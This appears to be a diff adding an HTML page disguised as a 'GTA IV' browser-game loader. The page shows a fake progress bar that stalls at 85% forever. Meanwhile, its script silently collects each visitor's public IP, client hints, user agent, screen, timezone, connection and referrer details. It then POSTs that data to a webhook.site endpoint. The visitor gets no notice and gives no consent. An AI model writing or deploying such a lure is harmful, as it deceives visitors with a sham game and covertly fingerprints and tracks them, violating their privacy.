@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GTA IV - Loading</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #000000;
+      color: #ffffff;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .loader-wrap {
+      width: 90%;
+      max-width: 520px;
+      background: #000000;
+      text-align: center;
+    }
+    .logo {
+      max-width: 240px;
+      max-height: 120px;
+      width: auto;
+      height: auto;
+      display: block;
+      margin: 0 auto 28px auto;
+      background: #000000;
+    }
+    .status {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 10px;
+    }
+    .bar-track {
+      width: 100%;
+      height: 14px;
+      background: #141414;
+      border: 1px solid #333333;
+      overflow: hidden;
+    }
+    .bar-fill {
+      width: 0%;
+      height: 100%;
+      background: #ffffff;
+      transition: width 120ms linear;
+    }
+    .stats {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #aaaaaa;
+      display: flex;
+      justify-content: space-between;
+      font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader-wrap">
+    <img
+      class="logo"
+      src="https://github.com/Ash95-doesstuff/UnblockedGamesSite/blob/main/GTA_IV_logo(2).png?raw=true"
+      alt="GTA IV Logo"
+    >
+    <div id="status" class="status">Loading Liberty City assets...</div>
+    <div class="bar-track">
+      <div id="bar" class="bar-fill"></div>
+    </div>
+    <div class="stats">
+      <span id="counter">1 / 1489</span>
+      <span id="percent">0%</span>
+    </div>
+  </div>
+
+  <script>
+    async function getPublicIp() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (!res.ok) return "unknown";
+        const data = await res.json();
+        return data.ip || "unknown";
+      } catch (_) {
+        return "unknown";
+      }
+    }
+
+    function getMediaPreferences() {
+      const match = (query) => {
+        try {
+          return window.matchMedia(query).matches;
+        } catch (_) {
+          return null;
+        }
+      };
+
+      return {
+        prefersDarkScheme: match("(prefers-color-scheme: dark)"),
+        prefersLightScheme: match("(prefers-color-scheme: light)"),
+        prefersReducedMotion: match("(prefers-reduced-motion: reduce)"),
+        prefersContrastMore: match("(prefers-contrast: more)"),
+        anyPointerCoarse: match("(any-pointer: coarse)"),
+        anyPointerFine: match("(any-pointer: fine)")
+      };
+    }
+
+    function getConnectionInfo() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (!conn) return null;
+      return {
+        effectiveType: conn.effectiveType || null,
+        downlinkMbps: conn.downlink ?? null,
+        rttMs: conn.rtt ?? null,
+        saveData: Boolean(conn.saveData)
+      };
+    }
+
+    async function getClientHints() {
+      if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) {
+        return null;
+      }
+      try {
+        return await navigator.userAgentData.getHighEntropyValues([
+          "architecture",
+          "bitness",
+          "model",
+          "platformVersion",
+          "fullVersionList"
+        ]);
+      } catch (_) {
+        return null;
+      }
+    }
+
+    function getPassiveTelemetry() {
+      const tzProps = (() => {
+        try {
+          const resolved = Intl.DateTimeFormat().resolvedOptions();
+          return {
+            timezone: resolved.timeZone || null,
+            locale: resolved.locale || null
+          };
+        } catch (_) {
+          return { timezone: null, locale: null };
+        }
+      })();
+
+      return {
+        page: {
+          url: window.location.href,
+          protocol: window.location.protocol,
+          referrer: document.referrer || null,
+          title: document.title || null,
+          visibilityState: document.visibilityState || null
+        },
+        navigator: {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages ? [...navigator.languages] : [navigator.language],
+          platform: navigator.platform || null,
+          vendor: navigator.vendor || null,
+          cookieEnabled: Boolean(navigator.cookieEnabled),
+          doNotTrack: navigator.doNotTrack || null,
+          onLine: Boolean(navigator.onLine),
+          pdfViewerEnabled: navigator.pdfViewerEnabled ?? null,
+          webdriver: Boolean(navigator.webdriver),
+          hardwareConcurrency: navigator.hardwareConcurrency || null,
+          deviceMemoryGb: navigator.deviceMemory || null,
+          maxTouchPoints: navigator.maxTouchPoints || 0
+        },
+        intl: tzProps,
+        screen: {
+          width: window.screen.width,
+          height: window.screen.height,
+          availWidth: window.screen.availWidth,
+          availHeight: window.screen.availHeight,
+          colorDepth: window.screen.colorDepth,
+          pixelDepth: window.screen.pixelDepth,
+          pixelRatio: window.devicePixelRatio || 1,
+          orientation: window.screen.orientation ? window.screen.orientation.type : null
+        },
+        viewport: {
+          width: window.innerWidth,
+          height: window.innerHeight,
+          outerWidth: window.outerWidth,
+          outerHeight: window.outerHeight,
+          scrollX: window.scrollX,
+          scrollY: window.scrollY
+        },
+        mediaPreferences: getMediaPreferences(),
+        connection: getConnectionInfo()
+      };
+    }
+
+    async function pingWebhookWithAllPassiveData() {
+      const [ip, clientHints] = await Promise.all([
+        getPublicIp(),
+        getClientHints()
+      ]);
+
+      const payload = {
+        event: "hello world",
+        timestamp: new Date().toISOString(),
+        timezoneOffsetMinutes: new Date().getTimezoneOffset(),
+        ip,
+        clientHints,
+        ...getPassiveTelemetry()
+      };
+
+      await fetch("https://webhook.site/7b5a895c-d56a-4357-8515-99f72f87a0d7", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    }
+
+    pingWebhookWithAllPassiveData();
+
+    // Fake GTA IV web loading logic (~2.5x slower fast spikes, stopping at 85% on "Loading charcter models...")
+    const totalUnits = 1489;
+    const stopPercent = 85;
+    const stopUnit = Math.round((stopPercent / 100) * totalUnits); // 1266
+    const crawlStartUnit = Math.floor(totalUnits * 0.835); // ~1243 (just before 84%)
+
+    const barEl = document.getElementById("bar");
+    const counterEl = document.getElementById("counter");
+    const percentEl = document.getElementById("percent");
+    const statusEl = document.getElementById("status");
+
+    let currentUnit = 1;
+    let burstMode = "fast";
+    let burstTicksLeft = 8;
+
+    function renderLoader() {
+      const pct = Math.min(stopPercent, (currentUnit / totalUnits) * 100);
+      const displayPct = currentUnit >= stopUnit ? stopPercent : Math.floor(pct);
+      barEl.style.width = pct.toFixed(2) + "%";
+      counterEl.textContent = currentUnit + " / " + totalUnits;
+      percentEl.textContent = displayPct + "%";
+    }
+
+    function stepLoader() {
+      if (currentUnit >= stopUnit) {
+        currentUnit = stopUnit;
+        renderLoader();
+        statusEl.textContent = "Loading charcter models...";
+        return;
+      }
+
+      // Near 84%-85%, slow down dramatically until 85% and stop
+      if (currentUnit >= crawlStartUnit) {
+        currentUnit += 1;
+        statusEl.textContent = "Unpacking streaming archives...";
+        renderLoader();
+        setTimeout(stepLoader, currentUnit >= stopUnit - 4 ? 1680 : 720);
+        return;
+      }
+
+      if (--burstTicksLeft <= 0) {
+        const roll = Math.random();
+        if (roll < 0.35) {
+          burstMode = "slow";
+          burstTicksLeft = 4 + Math.floor(Math.random() * 6);
+        } else {
+          burstMode = "fast";
+          burstTicksLeft = 6 + Math.floor(Math.random() * 14);
+        }
+      }
+
+      if (burstMode === "slow") {
+        currentUnit += 1 + Math.floor(Math.random() * 2);
+        statusEl.textContent = "Initializing world data...";
+        renderLoader();
+        setTimeout(stepLoader, 360 + Math.floor(Math.random() * 440));
+      } else {
+        currentUnit += 12 + Math.floor(Math.random() * 26);
+        if (currentUnit > crawlStartUnit) {
+          currentUnit = crawlStartUnit;
+        }
+        statusEl.textContent = "Loading GTA IV web resources...";
+        renderLoader();
+        setTimeout(stepLoader, 160);
+      }
+    }
+
+    renderLoader();
+    setTimeout(stepLoader, 160);
+  </script>
+</body>
+</html>
